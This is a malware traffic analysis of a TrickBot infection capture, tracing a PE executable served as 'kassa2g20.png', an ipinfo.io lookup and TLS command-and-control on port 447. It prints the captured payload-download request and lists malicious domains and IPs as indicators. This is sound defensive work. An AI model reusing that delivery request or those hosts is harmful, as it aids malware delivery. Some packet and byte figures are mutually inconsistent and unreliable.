# TrickBot Infection — Full Traffic Analysis

|---|---|
| **PCAP** | `2017-09-18-Trickbot-infection-traffic.pcap` |
| **Source** | malware-traffic-analysis.net |
| **Tool** | Wireshark |
| **Analyst** | Harilal P |

---

## Objective

Analyze a TrickBot malware infection PCAP to identify the infected host, understand the infection behavior, extract network-based indicators of compromise, and map activity to known TrickBot techniques — without malware reverse engineering.

---

## Step 1 — Protocol Hierarchy

![Protocol Hierarchy](screenshots/Protocol_Hierarchy.png)

First stop: **Statistics → Protocol Hierarchy**.

| Protocol | % of Traffic |
|----------|-------------|
| TCP | 99.8% |
| TLS | 11.5% |
| HTTP | 0.1% |
| DNS | 0.2% |

TLS dominates. Most of the traffic in this capture is encrypted, so the malware was deliberately hiding behind it. The HTTP slice is tiny but it turned out to be where everything interesting happened — the payload download and the recon request both came through there in cleartext.

---

## Step 2 — Infected Host Identification

![Victim Host Identification](screenshots/Victim_Host_Identification.png)

**Statistics → Endpoints → IPv4**

| IP Address | Packets | Bytes | Role |
|------------|---------|-------|------|
| `10.9.18.105` | 2,353 | 2 MB | **Infected host** |
| `77.236.96.52` | 530 | 548 kB | Payload delivery server |
| `194.87.144.27` | 979 | 665 kB | C2 server (primary) |
| `194.87.232.127` | 767 | 752 kB | C2 server (secondary) |
| `94.242.224.226` | 24 | 2 kB | Unknown external |
| `185.158.115.47` | 24 | 2 kB | Unknown external |
| `216.239.34.21` | 25 | 6 kB | ipinfo.io (recon) |

`10.9.18.105` is the infected host — 2,353 packets and 2MB is a significant lead over everything else.

> **Note:** `194.87.144.27` had 979 packets vs `194.87.232.127`'s 767, which makes `194.87.144.27` the heavier of the two C2 servers, not the secondary. Both are IOCs regardless.

---

## Step 3 — Public IP Reconnaissance

![Public IP Reconnaissance](screenshots/Public_IP_Reconnaissance.png)

**Filter:** `http.request`

Two HTTP GETs:
1. `GET /kassa2g20.png` → `77.236.96.52` (payload)
2. `GET /ip` → `216.239.34.21` (ipinfo.io)

The second one is TrickBot checking the victim's external IP before doing anything else. It's a standard pre-C2 step — geolocate the victim, confirm the infection landed where it was supposed to, and decide whether to keep going. The User-Agent was a real Chrome string (`Mozilla/5.0 Windows NT 10.0 WOW64 Chrome/57.0`) — blending in with normal browsing traffic.

---

## Step 4 — Malicious Payload Disguised as PNG

![Malware Payload Disguised As PNG](screenshots/Malware_Payload_Disguised_As_PNG.png)

**Filter:** `http.request`  
**Packet:** `GET /kassa2g20.png` from `10.9.18.105` to `77.236.96.52`

Following the TCP stream:

```http
GET /kassa2g20.png HTTP/1.1
Host: 6-express.ch

HTTP/1.1 200 OK
Content-Type: image/png
Content-Length: 528384

MZ............This program cannot be run in DOS mode.
```

The server said `image/png`. The file starts with `MZ`. That's a Windows PE executable — the DOS mode string makes it certain.

This is **masquerading**: a PE hosted on a web server, served with a fake content type and a `.png` extension. Extension filtering won't catch it. Proxies checking content-type headers instead of file magic won't catch it either. In logs it looks like an image download.

> **File size:** 528,384 bytes (~516KB) — consistent with a TrickBot installer DLL.

---

## Step 5 — DNS Analysis

### 6-express.ch Resolution

![DNS Query 6-express.ch](screenshots/DNS_Query_6Express.png)

**Filter:** `dns`

First DNS query in the capture — `10.9.18.105` asked the local resolver at `10.9.18.1` for `6-express.ch`, got back `77.236.96.52`. The HTTP GET for `kassa2g20.png` followed immediately.

```
DNS:      6-express.ch → 77.236.96.52
HTTP GET: /kassa2g20.png from 77.236.96.52
```

### ipinfo.io Resolution

![DNS Query ipinfo.io](screenshots/DNS_Query_IPInfo.png)

Second DNS query: `ipinfo.io` → `216.239.34.21`. The recon request followed.

```
DNS:      ipinfo.io → 216.239.34.21
HTTP GET: /ip to 216.239.34.21
```

Only two domains in the whole capture. The C2 servers at `194.87.144.27` and `194.87.232.127` were almost certainly hardcoded IPs — no DNS resolution needed, no domain to block.

---

## Step 6 — TLS C2 Communication on Port 447

![TLS C2 Communication Port 447](screenshots/TLS_C2_Communication_Port447.png)

**Filter:** `ip.addr == 194.87.232.127`

767 packets, session opened to **port 447**. No standard service runs on 447. Legitimate HTTPS is 443. TrickBot uses 447 and 449 specifically to sidestep detection rules built around standard port numbers.

TLS handshake sequence:

```
Client Hello
  └── Server Hello, Certificate, Server Key Exchange, Server Hello Done
        └── Client Key Exchange, Change Cipher Spec, Encrypted Handshake Message
              └── Application Data  ← encrypted C2 begins
```

### TCP Conversations View

![TCP Conversation Summary](screenshots/TCP_Conversation_Summary.png)

Single conversation: `10.9.18.105:49174 → 194.87.232.127:447` — 116 packets, 99kB.

> **Detection note:** Outbound TLS to port 447 or 449 in an enterprise environment is a high-confidence TrickBot indicator. The traffic itself can't be read without the server's private key, but the port, sustained session, and volume to a known malicious IP tell the story.

---

## Step 7 — No HTTP POST Observed

No results for `http.request.method == "POST"`.

That doesn't mean exfiltration didn't happen. TrickBot moves stolen data through its encrypted C2 channel, not plaintext HTTP POST. The 665kB to `194.87.144.27` and 752kB to `194.87.232.127` likely include exfil, but there's no way to confirm without decrypting the TLS session.

> **Limitation:** Absence of visible exfiltration isn't absence of exfiltration.

---

## Attack Flow Summary

```
Infected host: 10.9.18.105
         │
         ├─ DNS query: 6-express.ch → 77.236.96.52
         ├─ HTTP GET: /kassa2g20.png (PE executable disguised as PNG)
         ├─ Payload delivered: 528KB Windows executable
         │
         ├─ DNS query: ipinfo.io → 216.239.34.21
         ├─ HTTP GET: /ip (public IP recon)
         │
         ├─ Direct TCP: 194.87.144.27:447 (primary C2, 665kB)
         └─ Direct TCP: 194.87.232.127:447 (secondary C2, 752kB)
                  │
                  └─ TLS handshake → encrypted C2 + likely exfil
```

---

## IOC Summary

| Type | Value | Context |
|------|-------|---------|
| Infected host | `10.9.18.105` | Highest traffic internal IP |
| Gateway/DNS | `10.9.18.1` | Local resolver |
| Delivery domain | `6-express.ch` | Hosted malicious payload |
| Delivery IP | `77.236.96.52` | Resolved from 6-express.ch |
| Malicious file | `kassa2g20.png` | PE executable, 528KB |
| Recon domain | `ipinfo.io` | External IP lookup |
| C2 IP (primary) | `194.87.144.27` | Port 447, TLS, 665kB |
| C2 IP (secondary) | `194.87.232.127` | Port 447, TLS, 752kB |
| C2 port | `447/TCP` | Non-standard TrickBot port |
| Unknown external | `94.242.224.226` | Low traffic, unattributed |
| Unknown external | `185.158.115.47` | Low traffic, unattributed |

---

## MITRE ATT&CK Mapping

| Technique | ID | Evidence |
|-----------|----|---------|
| Ingress Tool Transfer | [T1105](https://attack.mitre.org/techniques/T1105/) | `kassa2g20.png` payload download |
| Masquerading | [T1036.005](https://attack.mitre.org/techniques/T1036/005/) | PE disguised as PNG, fake content-type |
| Gather Victim Network Info | [T1590](https://attack.mitre.org/techniques/T1590/) | ipinfo.io IP check |
| Non-Standard Port | [T1571](https://attack.mitre.org/techniques/T1571/) | C2 on TCP 447 |
| Encrypted Channel | [T1573](https://attack.mitre.org/techniques/T1573/) | TLS C2 traffic |
| Exfiltration Over C2 Channel | [T1041](https://attack.mitre.org/techniques/T1041/) | Data transferred via TLS C2 |

---

## Analysis Limitations

- TLS traffic is unreadable without the server's private key — C2 commands and exfil contents are unknown
- No DHCP traffic in the capture — couldn't recover the Windows hostname
- `94.242.224.226` and `185.158.115.47` remain unattributed — low traffic, could be additional C2 or noise
- The capture window may not cover the full infection timeline
- No memory forensics — host-based indicators out of scope

---

## Tools Used

- Wireshark 4.x
- TCP stream analysis
- Statistics → Endpoints, Protocol Hierarchy, Conversations
- PCAP source: [malware-traffic-analysis.net](https://www.malware-traffic-analysis.net)
